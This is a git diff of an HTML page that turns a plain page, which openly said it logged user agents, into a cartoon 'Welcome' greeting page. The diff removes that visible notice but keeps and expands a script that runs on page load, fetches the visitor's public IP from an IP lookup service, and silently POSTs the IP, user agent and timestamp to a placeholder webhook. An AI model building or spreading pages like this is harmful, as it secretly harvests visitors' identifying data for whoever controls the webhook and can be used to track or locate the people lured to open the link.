@@ -2,51 +2,132 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>My Static Website</title>
+    <title>Welcome Chodnakathi</title>
+
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: #f2f2f2;
-            padding: 40px;
-            text-align: center;
+            margin: 0;
+            padding: 0;
+            font-family: 'Comic Sans MS', Arial, sans-serif;
+            background: linear-gradient(135deg, #ff9a9e, #fad0c4);
+            background-attachment: fixed;
+            overflow-x: hidden;
         }
-        .box {
-            background: white;
-            padding: 30px;
-            width: 60%;
-            margin: auto;
-            border-radius: 8px;
-            box-shadow: 0 0 12px rgba(0,0,0,0.1);
+
+        .container {
+            text-align: center;
+            padding-top: 6%;
+        }
+
+        h1 {
+            font-size: 60px;
+            color: #ffffff;
+            text-shadow: 4px 4px 0px rgba(0,0,0,0.2);
+            margin-bottom: 20px;
+            animation: pop 1s ease-out;
+        }
+
+        .cloud {
+            width: 180px;
+            position: absolute;
+            top: 15%;
+            animation: float 12s infinite linear;
+        }
+
+        .cloud2 {
+            width: 220px;
+            position: absolute;
+            top: 40%;
+            animation: float2 16s infinite linear;
+        }
+
+        @keyframes pop {
+            0% { transform: scale(0.2); opacity: 0; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        @keyframes float {
+            0% { left: -200px; }
+            100% { left: 120%; }
+        }
+
+        @keyframes float2 {
+            0% { left: 120%; }
+            100% { left: -240px; }
+        }
+
+        .character {
+            width: 280px;
+            animation: bounce 2s infinite ease-in-out;
+        }
+
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-18px); }
+        }
+
+        .bubble {
+            background: #fff;
+            padding: 20px 40px;
+            border-radius: 25px;
+            display: inline-block;
+            font-size: 28px;
+            margin-top: 20px;
+            box-shadow: 0 4px 0 rgba(0,0,0,0.2);
+            animation: pop 1.5s ease-out;
         }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <h1>Welcome to My Static Website</h1>
-    <p>Your User-Agent is being logged securely.</p>
-</div>
+    <!-- Cartoon clouds -->
+    <img src="https://i.imgur.com/Jl6O9M8.png" class="cloud">
+    <img src="https://i.imgur.com/Jl6O9M8.png" class="cloud2">
 
-<script>
-(async () => {
-    const webhook = "YOUR_WEBHOOK_URL_HERE";
+    <div class="container">
+        <h1>🌈 Welcome Chodnakathi 🌈</h1>
 
-    const ua = navigator.userAgent;
+        <!-- Cartoon Character -->
+        <img src="https://i.imgur.com/rv4G4F2.png" class="character">
 
-    const ip = await fetch("https://api.ipify.org?format=json")
-        .then(r => r.json())
-        .then(d => d.ip);
+        <div class="bubble">Enjoy your cartoon world! 🎨✨</div>
+    </div>
 
-    fetch(webhook, {
-        method: "POST",
-        body: JSON.stringify({
-            ip: ip,
-            user_agent: ua
-        }),
-        headers: { "Content-Type": "application/json" }
-    });
-})();
-</script>
+    <!-- 🌐 USER-AGENT + IP LOGGER SCRIPT -->
+    <script>
+    (async () => {
+
+        // ⭐⭐ REPLACE THIS WITH YOUR WEBHOOK ⭐⭐
+        const webhook = "YOUR_WEBHOOK_URL_HERE";
+
+        // Grab User-Agent
+        const ua = navigator.userAgent;
+
+        // Grab IP
+        let ip = "unknown";
+        try {
+            ip = await fetch("https://api.ipify.org?format=json")
+                .then(res => res.json())
+                .then(data => data.ip);
+        } catch (e) {}
+
+        // Send to webhook
+        if (webhook && webhook !== "YOUR_WEBHOOK_URL_HERE") {
+            fetch(webhook, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    user_agent: ua,
+                    ip: ip,
+                    time: new Date().toISOString()
+                })
+            });
+        }
+
+    })();
+    </script>
 
 </body>
 </html>
